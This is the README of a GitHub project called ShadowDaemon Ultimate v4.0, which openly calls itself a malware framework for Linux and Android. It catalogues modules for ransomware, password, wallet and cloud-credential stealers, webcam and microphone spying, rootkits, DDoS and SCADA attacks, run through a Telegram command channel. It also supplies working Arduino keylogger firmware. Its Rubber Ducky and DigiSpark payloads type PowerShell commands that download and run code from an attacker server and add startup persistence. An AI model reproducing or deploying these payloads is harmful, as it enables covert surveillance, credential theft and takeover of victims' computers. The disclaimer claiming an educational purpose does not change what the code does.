# 🐉 SHADOWDAEMON ULTIMATE EDITION v4.0

<img width="1254" height="1254" alt="1000294753" src="https://github.com/user-attachments/assets/dfe97fc5-f98e-47e5-8dd2-e03a1ddb372f" />

> *"hack the system. own the root. stay anonymous."*

[![Version](https://img.shields.io/badge/version-4.0-red.svg)](https://github.com/hidayat-tanjung/ShadowDaemon_Ultimate)
[![License](https://img.shields.io/badge/license-MIT-blue.svg)](https://opensource.org/licenses/MIT)
[![Python](https://img.shields.io/badge/python-3.8+-green.svg)](https://www.python.org/)
[![Platform](https://img.shields.io/badge/platform-Linux%20%7C%20Android-orange.svg)](https://termux.com/)
[![Modules](https://img.shields.io/badge/modules-100+-brightgreen.svg)](https://github.com/hidayat-tanjung/ShadowDaemon_Ultimate)

> **⚠️ DISCLAIMER:** This tool is for **educational and research purposes only**. Use only on systems you own or have explicit permission to test. The author is not responsible for any misuse or damage caused by this tool.

---

## 📌 TABLE OF CONTENTS

- [Overview](#-overview)
- [Features](#-features)
- [Architecture](#-architecture)
- [Installation](#-installation)
  - [Termux (Android)](#-installation-on-termux-android)
  - [Linux (Ubuntu/Debian/Kali)](#-installation-on-linux)
- [Configuration](#-configuration)
- [Usage](#-usage)
- [Commands Reference](#-commands-reference)
- [Modules Explanation](#-modules-explanation)
- [USB Attacks](#-usb-attacks)
- [Arduino Setup](#-arduino-setup)
  - [Hardware Keylogger (Arduino Nano/Uno)](#-hardware-keylogger-arduino-nanouno)
  - [USB Rubber Ducky (Arduino Leonardo)](#-usb-rubber-ducky-arduino-leonardo)
  - [DigiSpark (Cheap Alternative)](#-digispark-cheap-alternative)
- [Payload Generation](#-payload-generation)
- [Telegram Bot Setup](#-telegram-bot-setup)
- [Troubleshooting](#-troubleshooting)
- [FAQ](#-faq)
- [License](#-license)

---

## 🔥 OVERVIEW

**ShadowDaemon Ultimate v4.0** adalah **Malware Framework** paling lengkap untuk Linux dan Termux (Android). Dengan **100+ modules**, lo bisa melakukan berbagai macam serangan dari **Reconnaissance** sampe **Kernel Rootkit**, **SCADA Exploitation**, dan **AI-based attacks**.

```
root@shadow:~# whoami
shadow_demon

> nmap -sS -T4 -A target
> scan complete
> ports: 22/open 80/open 443/open
> system info
> os: Linux
> kernel: 6.6.0
> uptime: 2d 14h 37m
> access granted

Linux is freedom. Knowledge is power.
```

### ⚡ Key Highlights

- **100+ Modules** - Dari basic sampai advanced + AI
- **Multi-C2 Support** - Telegram & Firebase
- **Persistence Mechanisms** - systemd, cron, rc.local
- **Kernel-Level Rootkit** - Process hiding
- **SCADA/ICS Exploitation** - Stuxnet-style
- **CPU Microcode Injection** - Level paling dalam
- **Hardware Attacks** - USB keylogger, Rubber Ducky
- **AI-Based Exploits** - Automated pentesting
- **Cross-Platform** - Linux & Termux (Android)

---

## 🎯 FEATURES

### 🕵️ Reconnaissance (10 modules)
| Module | Function |
|--------|----------|
| `geo_tracker.py` | Track victim location via IP |
| `network_exploiter.py` | Scan network and discovery |
| `wifi_stealer.py` | Steal WiFi passwords |
| `password_stealer.py` | Steal browser passwords (Chrome/Firefox) |
| `shell.py` | Execute remote shell commands |
| `port_scanner.py` | Scan ports on target |
| `mass_scanner.py` | Mass network scanner |
| `admin_finder.py` | Find admin login pages |
| `dns_enum.py` | DNS enumeration |
| `whois_lookup.py` | WHOIS lookup |

### 🎥 Monitoring & Surveillance (15 modules)
| Module | Function |
|--------|----------|
| `screenshot.py` | Take screenshot |
| `webcam.py` | Capture webcam |
| `mic.py` | Record microphone |
| `screen_recorder.py` | Record screen (video) |
| `keylogger.py` | Record all keystrokes |
| `keylog_persist.py` | Persistent keylogger |
| `screen_stream.py` | Live screen streaming |
| `audio_stream.py` | Live audio streaming |
| `webcam_spy.py` | Live webcam spying |
| `mic_spy.py` | Live microphone spying |
| `clipboard_stealer.py` | Steal clipboard content |
| `browser_history.py` | Get browser history |
| `cookies_stealer.py` | Steal browser cookies |
| `notification_spy.py` | Spy notifications |
| `wallpaper_changer.py` | Change desktop wallpaper |

### 💀 Attack Vectors (20 modules)
| Module | Function |
|--------|----------|
| `ddos.py` | DDoS (UDP flood, SYN flood) |
| `ransomware.py` | Ransomware (AES-256 encryption) |
| `ssh_bruteforce.py` | SSH Bruteforce |
| `port_knocking.py` | Firewall bypass |
| `network_exploiter.py` | DNS Amplification, MAC flooding |
| `plc_scada.py` | Industrial protocol flooding |
| `log4shell.py` | Log4Shell exploit |
| `spring4shell.py` | Spring4Shell exploit |
| `eternalblue.py` | EternalBlue exploit (MS17-010) |
| `zerologon.py` | ZeroLogon exploit |
| `printnightmare.py` | PrintNightmare exploit |
| `bluekeep.py` | BlueKeep exploit (CVE-2019-0708) |
| `smbghost.py` | SMBGhost exploit (CVE-2020-0796) |
| `proxylogon.py` | ProxyLogon exploit |
| `petitpotam.py` | PetitPotam NTLM coercion |
| `sql_injection.py` | SQL Injection tester |
| `xss_tester.py` | XSS tester |
| `lfi_rfi_tester.py` | LFI/RFI tester |
| `cmd_injection.py` | Command injection tester |
| `docker_escape.py` | Docker container escape |

### 🔒 Persistence & Evasion (8 modules)
| Module | Function |
|--------|----------|
| `persistence.py` | Auto-start via systemd/cron |
| `hider.py` | Process hiding (kernel level) |
| `anti_forensic.py` | Anti-forensic capabilities |
| `crypter.py` | Binary encryption (FUD) |
| `log_cleaner.py` | Clean system logs |
| `vpn_killer.py` | Kill VPN processes |
| `tor_killer.py` | Kill Tor processes |
| `self_destruct.py` | Self-destruct malware |

### 🎛️ Advanced Exploitation (13 modules)
| Module | Function |
|--------|----------|
| `bootkit.py` | Bootloader infection (GRUB/Syslinux) |
| `bios_rootkit.py` | BIOS/UEFI rootkit |
| `cpu_microcode.py` | CPU microcode patching |
| `plc_scada.py` | PLC/SCADA attacks (Stuxnet-style) |
| `docker_escape.py` | Docker container escape |
| `k8s_attack.py` | Kubernetes cluster attack |
| `ad_attack.py` | Active Directory attack |
| `bloodhound.py` | BloodHound collector |
| `mimikatz.py` | Mimikatz-style credential dump |
| `responder.py` | LLMNR/NBT-NS poisoning |
| `ntlm_relay.py` | NTLM relay attack |
| `kerberos.py` | Kerberos ticket attack |
| `petitpotam.py` | PetitPotam NTLM coercion |

### 🔧 Hardware Attacks (3 modules)
| Module | Function |
|--------|----------|
| `usb_spreader.py` | USB auto-spreader |
| `hardware_keylogger.py` | Hardware keylogger (Arduino/Teensy) |
| `usb_rubber_ducky.py` | USB Rubber Ducky payload generation |

### 📡 C2 Channels (4 modules)
| Module | Function |
|--------|----------|
| `telegram_c2.py` | Telegram Bot C2 |
| `firebase_c2.py` | Firebase Realtime Database C2 |
| `dns_tunneling.py` | DNS Tunneling (data exfiltration) |
| `icmp_tunneling.py` | ICMP Tunneling (data exfiltration) |

### 💰 Stealers (4 modules)
| Module | Function |
|--------|----------|
| `crypto_stealer.py` | Steal cryptocurrency wallets |
| `ssh_stealer.py` | Steal SSH keys |
| `cloud_stealer.py` | Steal cloud credentials (AWS/GCP/Azure) |
| `token_stealer.py` | Steal Discord/Telegram tokens |

### 🛠️ Payload Generation (4 modules)
| Module | Function |
|--------|----------|
| `payload_gen.py` | FUD payload generator |
| `crypter.py` | Binary encryption |
| `reverse_shell_gen.py` | Reverse shell generator |
| `exe_builder.py` | Windows .exe builder |

### 📂 File Management (3 modules)
| Module | Function |
|--------|----------|
| `file_browser.py` | Browse files on target |
| `file_downloader.py` | Download file from target |
| `file_uploader.py` | Upload file to target |

### ⚙️ System Control (5 modules)
| Module | Function |
|--------|----------|
| `shell.py` | Remote shell execution |
| `system_info.py` | System information gathering |
| `notification_spam.py` | Spam notifications |
| `wallpaper_changer.py` | Change desktop wallpaper |
| `scheduler.py` | Scheduled tasks |

### 🤖 AI & Automation (5 modules)
| Module | Function |
|--------|----------|
| `exploit_suggester.py` | Suggest exploits based on OS |
| `auto_update.py` | Self-update from GitHub |
| `scheduled_tasks.py` | Automated scheduled tasks |
| `remote_mouse.py` | Remote mouse control |
| `remote_keyboard.py` | Remote keyboard control |

---

## 🏗️ ARCHITECTURE

```
ShadowDaemon_Ultimate/
├── shadow.py                          # Main controller (v4.0)
├── config.json                        # Configuration file
├── requirements.txt                   # Python dependencies
├── requirements_linux.txt             # Linux full dependencies
├── setup.sh                          # Universal installer
├── setup_linux.sh                    # Linux installer
├── setup_termux.sh                   # Termux installer
├── Makefile                          # Build system
├── wordlist.txt                      # SSH brute force wordlist
├── README.md                         # Documentation (v4.0)
│
├── modules/                          # All modules (100+ files)
│   ├── __init__.py
│   ├── shell.py                      # Remote shell execution
│   ├── keylogger.py                  # Keystroke logging
│   ├── keylog_persist.py             # Persistent keylogger
│   ├── webcam.py                     # Webcam capture
│   ├── webcam_spy.py                 # Live webcam spying
│   ├── mic.py                        # Microphone recording
│   ├── mic_spy.py                    # Live microphone spying
│   ├── screenshot.py                 # Screenshot capture
│   ├── screen_recorder.py            # Video recording
│   ├── screen_stream.py              # Live screen streaming
│   ├── ransomware.py                 # AES-256 ransomware
│   ├── miner.py                      # Crypto mining (Monero)
│   ├── ddos.py                       # DDoS attacks
│   ├── persistence.py                # Auto-start mechanisms
│   ├── payload_gen.py                # FUD payload generator
│   ├── crypter.py                    # Binary encryption
│   ├── usb_spreader.py               # USB auto-infection
│   ├── password_stealer.py           # Browser credentials
│   ├── clipboard_stealer.py          # Clipboard stealing
│   ├── browser_history.py            # Browser history stealing
│   ├── cookies_stealer.py            # Cookie stealing
│   ├── crypto_stealer.py             # Crypto wallet stealing
│   ├── ssh_stealer.py                # SSH key stealing
│   ├── cloud_stealer.py              # Cloud credential stealing
│   ├── token_stealer.py              # Token stealing
│   ├── geo_tracker.py                # Location tracking
│   ├── wifi_stealer.py               # WiFi passwords
│   ├── remote_control.py             # Mouse/keyboard control
│   ├── scheduler.py                  # Scheduled tasks
│   ├── anti_forensic.py              # Evidence wiping
│   ├── hider.py                      # Process hiding
│   ├── log_cleaner.py                # Log cleaning
│   ├── vpn_killer.py                 # VPN killing
│   ├── tor_killer.py                 # Tor killing
│   ├── ssh_bruteforce.py             # SSH attacks
│   ├── port_knocking.py              # Firewall bypass
│   ├── dns_tunneling.py              # DNS exfiltration
│   ├── icmp_tunneling.py             # ICMP exfiltration
│   ├── cpu_microcode.py              # CPU backdoor
│   ├── network_exploiter.py          # Network attacks
│   ├── plc_scada.py                  # ICS exploitation
│   ├── bootkit.py                    # Bootloader infection
│   ├── bios_rootkit.py               # Firmware infection
│   ├── hardware_keylogger.py         # USB keylogger
│   ├── usb_rubber_ducky.py           # Ducky payloads
│   ├── log4shell.py                  # Log4Shell exploit
│   ├── spring4shell.py               # Spring4Shell exploit
│   ├── eternalblue.py                # EternalBlue exploit
│   ├── zerologon.py                  # ZeroLogon exploit
│   ├── printnightmare.py             # PrintNightmare exploit
│   ├── bluekeep.py                   # BlueKeep exploit
│   ├── smbghost.py                   # SMBGhost exploit
│   ├── proxylogon.py                 # ProxyLogon exploit
│   ├── petitpotam.py                 # PetitPotam exploit
│   ├── sql_injection.py              # SQL Injection tester
│   ├── xss_tester.py                 # XSS tester
│   ├── lfi_rfi_tester.py             # LFI/RFI tester
│   ├── cmd_injection.py              # Command injection tester
│   ├── docker_escape.py              # Docker escape
│   ├── k8s_attack.py                 # Kubernetes attack
│   ├── ad_attack.py                  # Active Directory attack
│   ├── bloodhound.py                 # BloodHound collector
│   ├── mimikatz.py                   # Mimikatz-style dumper
│   ├── responder.py                  # Responder poisoning
│   ├── ntlm_relay.py                 # NTLM relay
│   ├── kerberos.py                   # Kerberos attack
│   ├── exploit_suggester.py          # Exploit suggestion
│   ├── auto_update.py                # Self-update
│   ├── notification_spam.py          # Notification spam
│   ├── wallpaper_changer.py          # Wallpaper changer
│   ├── reverse_shell_gen.py          # Reverse shell generator
│   ├── exe_builder.py                # Windows exe builder
│   ├── file_browser.py               # File browser
│   ├── file_downloader.py            # File downloader
│   ├── file_uploader.py              # File uploader
│   ├── dns_enum.py                   # DNS enumeration
│   ├── whois_lookup.py               # WHOIS lookup
│   ├── port_scanner.py               # Port scanner
│   ├── mass_scanner.py               # Mass scanner
│   └── admin_finder.py               # Admin page finder
│
├── c2/                               # C2 communication
│   ├── __init__.py
│   ├── telegram_c2.py                # Telegram bot C2
│   └── firebase_c2.py                # Firebase API C2
│
└── kernel/                           # Kernel rootkit
    ├── shadow.c                      # LKM rootkit source
    └── Makefile                      # Kernel build file
```

---

## 📥 INSTALLATION

### 📱 Installation on Termux (Android)

#### Step 1: Install Termux
```bash
# Download Termux dari F-Droid (BUKAN Play Store!)
# https://f-droid.org/en/packages/com.termux/
```

#### Step 2: Setup Storage
```bash
termux-setup-storage
```

#### Step 3: Update & Install Dependencies
```bash
pkg update && pkg upgrade -y
pkg install -y python git wget curl
pkg install -y scrot fswebcam alsa-utils nmap net-tools
pkg install -y rust
```

#### Step 4: Clone Project
```bash
git clone https://github.com/hidayat-tanjung/ShadowDaemon_Ultimate.git
cd ShadowDaemon_Ultimate
```

#### Step 5: Install Python Packages
```bash
# Install dari requirements
pip install -r requirements.txt

# Install bcrypt & paramiko dari pkg (biar gak error)
pkg install python-bcrypt python-pynacl python-paramiko -y
```

#### Step 6: Edit Config
```bash
nano config.json
# Ganti token dan chat_id
```

#### Step 7: Run
```bash
python3 shadow.py
```

---

### 🐧 Installation on Linux (Ubuntu/Debian/Kali)

#### Step 1: Update System
```bash
sudo apt update && sudo apt upgrade -y
```

#### Step 2: Install Dependencies
```bash
sudo apt install -y python3 python3-pip git wget curl
sudo apt install -y scrot fswebcam alsa-utils nmap net-tools
sudo apt install -y ffmpeg xdotool build-essential
sudo apt install -y python3-cryptography python3-paramiko python3-bcrypt
```

#### Step 3: Clone Project
```bash
git clone https://github.com/hidayat-tanjung/ShadowDaemon_Ultimate.git
cd ShadowDaemon_Ultimate
```

#### Step 4: Install Python Packages
```bash
pip3 install -r requirements_linux.txt
```

#### Step 5: Edit Config
```bash
nano config.json
# Ganti token dan chat_id
```

#### Step 6: Run
```bash
python3 shadow.py
```

---

## ⚙️ CONFIGURATION

### Config File: `config.json`

```json
{
    "c2_type": "telegram",
    "telegram_token": "YOUR_BOT_TOKEN_FROM_BOTFATHER",
    "telegram_chat_id": "YOUR_CHAT_ID",
    "firebase_url": "https://your-project.firebaseio.com/commands/{uid}.json",
    "persistence": false,
    "miner_wallet": "YOUR_MONERO_WALLET_ADDRESS",
    "miner_pool": "pool.supportxmr.com:3333",
    "target_ip": "192.168.1.1",
    "subnet": "192.168.1.0/24",
    "auto_start_modules": ["keylogger", "geo_tracker"]
}
```

### Setting Up Telegram Bot

1. **Create Bot:**
   ```
   Open Telegram → Search @BotFather → Send /newbot
   → Name: ShadowDaemonBot
   → Username: ShadowDaemon_bot
   → Copy TOKEN
   ```

2. **Get Chat ID:**
   ```
   Send message to your bot
   Visit: https://api.telegram.org/bot<TOKEN>/getUpdates
   Find "chat":{"id": 123456789}
   ```

3. **Update Config:**
   ```json
   "telegram_token": "YOUR_BOT_TOKEN_FROM_BOTFATHER",
   "telegram_chat_id": "YOUR_CHAT_ID"
   ```

---

## 🚀 USAGE

### Start ShadowDaemon

```bash
# Run in foreground
python3 shadow.py

# Run in background
nohup python3 shadow.py > shadow.log 2>&1 &

# Check logs
tail -f shadow.log
```

### Initial Output

```
╔═══════════════════════════════════════════════════════════╗
║   SHADOWDAEMON ULTIMATE EDITION v4.0                     ║
║   イズミー Active 😈🔥                                    ║
║   100+ Modules - From Basic to Apocalyptic Level         ║
╚═══════════════════════════════════════════════════════════╝
[*] ShadowDaemon is running... Waiting for commands...
```

### Telegram Notification

```
🚀 ShadowDaemon Ultimate v4.0 aktif!
💻 OS: Android 11
🌐 IP: 192.168.1.100
🆔 UID: termux-xxx
```

---

## 📋 COMMANDS REFERENCE

### 🏠 Basic Commands

| Command | Description | Example |
|---------|-------------|---------|
| `help` | Show all commands | `help` |
| `info` | System information | `info` |
| `shell:<cmd>` | Execute shell command | `shell:ls -la` |
| `selfdestruct` | Destroy malware | `selfdestruct` |

### 🕵️ Reconnaissance

| Command | Description | Example |
|---------|-------------|---------|
| `geo_location` | Get victim location | `geo_location` |
| `wifi_pass` | Steal WiFi passwords | `wifi_pass` |
| `scan_network` | Scan local network | `scan_network` |
| `steal_passwords` | Steal browser passwords | `steal_passwords` |
| `port_scan:<ip>` | Scan ports on target | `port_scan:192.168.1.1` |
| `mass_scan:<subnet>` | Mass scan network | `mass_scan:192.168.1.0/24` |
| `find_admin:<ip>` | Find admin login pages | `find_admin:192.168.1.1` |

### 🎥 Monitoring

| Command | Description | Example |
|---------|-------------|---------|
| `screenshot` | Take screenshot | `screenshot` |
| `webcam` | Capture webcam | `webcam` |
| `mic` | Record microphone (10s) | `mic` |
| `record_screen` | Record screen (30s) | `record_screen` |
| `keylog_start` | Start keylogger | `keylog_start` |
| `keylog_stop` | Stop keylogger | `keylog_stop` |
| `keylog_get` | Get captured keystrokes | `keylog_get` |
| `keylog_persist` | Install persistent keylogger | `keylog_persist` |
| `steal_clipboard` | Steal clipboard content | `steal_clipboard` |
| `get_history` | Get browser history | `get_history` |

### 💀 Attacks

| Command | Description | Example |
|---------|-------------|---------|
| `ransomware` | Encrypt /home files | `ransomware` |
| `ddos:<ip> <port>` | DDoS attack | `ddos:192.168.1.1 80` |
| `knock:<ip>` | Port knocking | `knock:192.168.1.1` |
| `network_exploit:<type>` | Network attacks | `network_exploit:mac_flood` |
| `industrial_flood` | Flood SCADA protocols | `industrial_flood` |
| `log4shell:<ip>` | Log4Shell exploit | `log4shell:192.168.1.1` |
| `mimikatz` | Credential dumping | `mimikatz` |
| `responder` | LLMNR/NBT-NS poisoning | `responder` |

### ⛏️ Mining

| Command | Description | Example |
|---------|-------------|---------|
| `miner_start` | Start crypto mining | `miner_start` |
| `miner_stop` | Stop crypto mining | `miner_stop` |

### 🔒 Persistence

| Command | Description | Example |
|---------|-------------|---------|
| `persist` | Install persistence | `persist` |
| `hide_self` | Hide process | `hide_self` |
| `wipe_trails` | Wipe forensic evidence | `wipe_trails` |
| `clean_logs` | Clean system logs | `clean_logs` |
| `kill_vpn` | Kill VPN processes | `kill_vpn` |

### 💾 USB Attacks

| Command | Description | Example |
|---------|-------------|---------|
| `usb_spread` | Auto-infect USB drives | `usb_spread` |
| `setup_usb_keylogger` | Setup hardware keylogger | `setup_usb_keylogger` |
| `create_ducky:<type>` | Create Rubber Ducky payload | `create_ducky:reverse_shell` |

### 🔬 Advanced Exploits

| Command | Description | Example |
|---------|-------------|---------|
| `install_bootkit` | Infect bootloader | `install_bootkit` |
| `install_bios_rootkit` | Infect BIOS/UEFI | `install_bios_rootkit` |
| `install_cpu_backdoor` | CPU microcode injection | `install_cpu_backdoor` |
| `trigger_smm:<cmd>` | Trigger SMM backdoor | `trigger_smm:2` |
| `scan_plc:<subnet>` | Scan for PLCs | `scan_plc:192.168.1.0/24` |
| `stuxnet:<target>` | Deploy Stuxnet payload | `stuxnet:192.168.1.50` |

### 💰 Stealers

| Command | Description | Example |
|---------|-------------|---------|
| `steal_crypto` | Steal crypto wallets | `steal_crypto` |
| `steal_ssh` | Steal SSH keys | `steal_ssh` |

### 🛠️ Payload

| Command | Description | Example |
|---------|-------------|---------|
| `gen_payload` | Generate FUD payload | `gen_payload` |
| `crypt_binary` | Encrypt binary | `crypt_binary` |
| `gen_reverse:<ip>:<port>` | Generate reverse shell | `gen_reverse:192.168.1.100:4444` |

### 📂 File Management

| Command | Description | Example |
|---------|-------------|---------|
| `browse_files:<path>` | Browse files | `browse_files:/home` |
| `download_file:<path>` | Download file | `download_file:/etc/passwd` |

### ⚙️ System Control

| Command | Description | Example |
|---------|-------------|---------|
| `auto_update` | Update malware from GitHub | `auto_update` |
| `notif_spam:<text>` | Spam notifications | `notif_spam:Hello` |
| `mouse:<x>,<y>` | Move mouse | `mouse:500,300` |
| `type:<text>` | Type text | `type:Hello World` |

---

## 🔌 USB ATTACKS

### Type 1: USB Spreader (Software)
- **NO** physical USB required
- Malware auto-copies to plugged USB drives
- Command: `usb_spread`

### Type 2: Hardware Keylogger (Physical)
- **REQUIRES** Arduino/Teensy
- Records victim keystrokes silently
- Command: `setup_usb_keylogger`

### Type 3: USB Rubber Ducky
- **REQUIRES** Arduino Leonardo / Rubber Ducky
- Executes payload in 5 seconds
- Command: `create_ducky:reverse_shell`

### Comparison

| Feature | USB Spreader | Hardware Keylogger | USB Rubber Ducky |
|---------|-------------|-------------------|------------------|
| **Needs Physical USB?** | ❌ No | ✅ Yes | ✅ Yes |
| **Cost** | Free | Rp 50-300k | Rp 30-800k |
| **How to Use** | Malware runs | Plug USB | Plug USB |
| **Function** | Spread malware | Record keystrokes | Execute payload |
| **Speed** | Slow | Fast | Very Fast |

---

## 🔧 ARDUINO SETUP

### 🛠️ Hardware Keylogger (Arduino Nano/Uno)

#### 📦 Components Needed

| No | Component | Price | Description |
|----|-----------|-------|-------------|
| 1 | Arduino Nano/Uno | Rp 50-100k | Main board |
| 2 | USB Cable | Rp 10-20k | Connect to PC |
| 3 | Jumper Wires | Rp 5-10k | Optional |
| 4 | Micro SD Card Module | Rp 20-30k | Optional storage |

#### 🔌 Wiring Diagram

```
Arduino Nano/Uno          USB Host (Target PC)
     |                           |
  GND ------------------------- GND
  RX (0) --------------------- TX (USB)
  TX (1) --------------------- RX (USB)
     |                           |
     +------> To PC (looks like charger)
```

#### 💻 Step 1: Install Arduino IDE

```bash
# Download from official website
https://www.arduino.cc/en/software

# Linux (Ubuntu/Debian)
sudo apt install arduino arduino-core -y

# Termux (Android)
pkg install arduino arduino-core -y
```

#### 📝 Step 2: Upload Firmware

```cpp
// Hardware Keylogger - Arduino Nano/Uno
// イズミー Active 😈🔥
// Full Keylogger with SD Card Support

#include <SoftwareSerial.h>
#include <SD.h>

#define RX 10
#define TX 11
SoftwareSerial mySerial(RX, TX);

const int chipSelect = 4;
File keylogFile;
String keylog = "";
unsigned long lastSend = 0;
bool sdCardReady = false;

void setup() {
  Serial.begin(9600);
  mySerial.begin(9600);
  
  if (!SD.begin(chipSelect)) {
    Serial.println("[!] SD Card failed!");
    sdCardReady = false;
  } else {
    sdCardReady = true;
    Serial.println("[*] SD Card ready!");
  }
  
  if (sdCardReady) {
    keylogFile = SD.open("keylog.txt", FILE_WRITE);
    if (keylogFile) {
      keylogFile.println("=== KEYLOGGER STARTED ===");
      keylogFile.close();
    }
  }
  
  Serial.println("[*] Keylogger Ready - XoXo AI Active 😈🔥");
  Serial.println("[*] Commands: GET_LOG, CLEAR_LOG, STATUS");
}

void loop() {
  if (mySerial.available()) {
    char c = mySerial.read();
    keylog += c;
    if (keylog.length() > 4096) {
      saveToSD(keylog);
      keylog = "";
    }
    Serial.print(c);
  }
  
  if (Serial.available()) {
    String cmd = Serial.readStringUntil('\n');
    cmd.trim();
    if (cmd == "GET_LOG") sendLog();
    else if (cmd == "CLEAR_LOG") clearLog();
    else if (cmd == "STATUS") sendStatus();
  }
  
  if (millis() - lastSend > 60000) {
    if (keylog.length() > 0) {
      saveToSD(keylog);
      keylog = "";
    }
    lastSend = millis();
  }
  
  delay(10);
}

void saveToSD(String data) {
  if (!sdCardReady) return;
  keylogFile = SD.open("keylog.txt", FILE_WRITE);
  if (keylogFile) {
    keylogFile.print(data);
    keylogFile.close();
  }
}

void sendLog() {
  Serial.println("=== KEYLOG START ===");
  if (keylog.length() > 0) {
    Serial.print(keylog);
    keylog = "";
  }
  if (sdCardReady) {
    keylogFile = SD.open("keylog.txt");
    if (keylogFile) {
      while (keylogFile.available()) {
        Serial.write(keylogFile.read());
      }
      keylogFile.close();
    }
  }
  Serial.println("=== KEYLOG END ===");
}

void clearLog() {
  keylog = "";
  if (sdCardReady) {
    SD.remove("keylog.txt");
    keylogFile = SD.open("keylog.txt", FILE_WRITE);
    if (keylogFile) {
      keylogFile.println("=== LOG CLEARED ===");
      keylogFile.close();
    }
  }
  Serial.println("[*] Log cleared!");
}

void sendStatus() {
  Serial.println("=== STATUS ===");
  Serial.print("Buffer size: ");
  Serial.println(keylog.length());
  Serial.print("SD Card: ");
  Serial.println(sdCardReady ? "Ready" : "Not ready");
  Serial.print("Uptime: ");
  Serial.println(millis() / 1000);
  Serial.println("===============");
}
```

#### ⬆️ Step 3: Upload to Arduino

```
1. Plug Arduino Nano to PC via USB
2. Tools → Board → Arduino Nano
3. Tools → Port → Select COMx (Windows) / dev/ttyUSB0 (Linux)
4. Tools → Processor → ATmega328P (Old Bootloader)
5. Click Upload (→) icon
6. Wait for "Upload Complete!"
```

#### 🧪 Step 4: Test

```
1. Plug Arduino into target PC (looks like charger)
2. Open Serial Monitor (Tools → Serial Monitor)
3. Set baud rate: 9600
4. Test commands:
   - GET_LOG → Get all keylogs
   - CLEAR_LOG → Clear keylogs
   - STATUS → Check status
```

#### 📤 Step 5: Read Keylog from Termux

```bash
# Read keylog via serial
python3 -c "
import serial
ser = serial.Serial('/dev/ttyUSB0', 9600, timeout=2)
ser.write(b'GET_LOG\n')
time.sleep(1)
while ser.in_waiting:
    print(ser.read(ser.in_waiting).decode())
"
```

---

### 🦆 USB Rubber Ducky (Arduino Leonardo)

#### 📦 Components Needed

| No | Component | Price | Description |
|----|-----------|-------|-------------|
| 1 | Arduino Leonardo | Rp 100-150k | Main board (ATmega32u4) |
| 2 | USB Cable | Rp 10-20k | Connect to PC |
| 3 | Micro USB Cable | Rp 10-20k | Target connection |

#### 💻 Step 1: Generate Payload in Termux

```bash
# Generate payload
create_ducky:reverse_shell
# Output: ducky_script.txt

# Other payloads:
create_ducky:keylogger
create_ducky:ransomware
create_ducky:persistence
```

#### 📝 Step 2: Upload to Arduino

```cpp
// USB Rubber Ducky - Arduino Leonardo
// イズミー Active 😈🔥
// Full Payload - Reverse Shell + Keylogger + Persistence

#include <Keyboard.h>

void setup() {
  Keyboard.begin();
  delay(2000);
  
  // STAGE 1: Open Run
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(500);
  
  // STAGE 2: Download & Execute
  Keyboard.println("powershell -Command \"$url='http://YOUR_IP/shadow.py';$path='%temp%\\shadow.py';Invoke-WebRequest -Uri $url -OutFile $path;Start-Process 'python' $path\"");
  delay(1000);
  Keyboard.press(KEY_RETURN);
  delay(500);
  
  // STAGE 3: Install Keylogger
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(500);
  Keyboard.println("powershell -Command \"Invoke-WebRequest -Uri 'http://YOUR_IP/keylogger.py' -OutFile '%temp%\\keylogger.py';Start-Process 'python' '%temp%\\keylogger.py'\"");
  delay(1000);
  Keyboard.press(KEY_RETURN);
  delay(500);
  
  // STAGE 4: Persistence
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(500);
  Keyboard.println("powershell -Command \"$WshShell = New-Object -comObject WScript.Shell;$Shortcut = $WshShell.CreateShortcut('$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\shadow.lnk');$Shortcut.TargetPath = '$env:temp\\shadow.exe';$Shortcut.Save()\"");
  delay(1000);
  Keyboard.press(KEY_RETURN);
  delay(500);
  
  // STAGE 5: Cleanup
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F4);
  delay(100);
  Keyboard.releaseAll();
  delay(500);
  
  Keyboard.println("exit");
  delay(500);
  Keyboard.press(KEY_RETURN);
  delay(500);
  
  Keyboard.end();
}

void loop() {}
```

**Replace `YOUR_IP` with your server IP!**

#### ⬆️ Step 3: Upload to Arduino

```
1. Plug Arduino Leonardo to PC via USB
2. Tools → Board → Arduino Leonardo
3. Tools → Port → Select COMx (Windows) / dev/ttyACM0 (Linux)
4. Click Upload (→) icon
5. Wait for "Upload Complete!"
```

#### 🧪 Step 4: Test

```
1. Plug Arduino Leonardo into target PC
2. Within 5-10 seconds, malware will:
   - Download shadow.py from your server
   - Install keylogger
   - Create persistence
   - Hide windows
3. You get access via Telegram!
```

---

### 💰 DigiSpark (Cheap Alternative)

#### 📦 Components Needed

| No | Component | Price |
|----|-----------|-------|
| 1 | DigiSpark | Rp 30-50k |
| 2 | USB Cable | Rp 10-20k |

#### 💻 Step 1: Install DigiSpark Board

```
File → Preferences
Add URL:
https://raw.githubusercontent.com/digistump/arduino-boards-index/master/package_digistump_index.json

Tools → Board → Boards Manager
Search "Digistump" → Install
```

#### 📝 Step 2: Upload Payload

```cpp
// DigiSpark Payload
// イズミー Active 😈🔥

#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell -Command \"Invoke-WebRequest -Uri 'http://YOUR_IP/shadow.py' -OutFile '%temp%\\shadow.py'; Start-Process 'python' '%temp%\\shadow.py'\"");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {}
```

**Replace `YOUR_IP` with your server IP!**

#### ⬆️ Step 3: Upload

```
1. Plug DigiSpark to PC
2. Tools → Board → Digistump AVR Boards → Digispark Default
3. Tools → Programmer → Micronucleus
4. Click Upload
5. Unplug and replug to trigger
```

---

### 📊 Hardware Comparison

| Device | Price | Function | Speed | Difficulty |
|--------|-------|----------|-------|------------|
| Arduino Leonardo | Rp 100-150k | Rubber Ducky | ⚡ Very Fast | 🟢 Easy |
| Arduino Nano | Rp 50-100k | Keylogger | 🐢 Medium | 🟡 Medium |
| DigiSpark | Rp 30-50k | Rubber Ducky | ⚡ Fast | 🟢 Easy |
| USB Rubber Ducky Original | Rp 500-800k | Rubber Ducky | ⚡ Very Fast | 🟢 Easy |

---

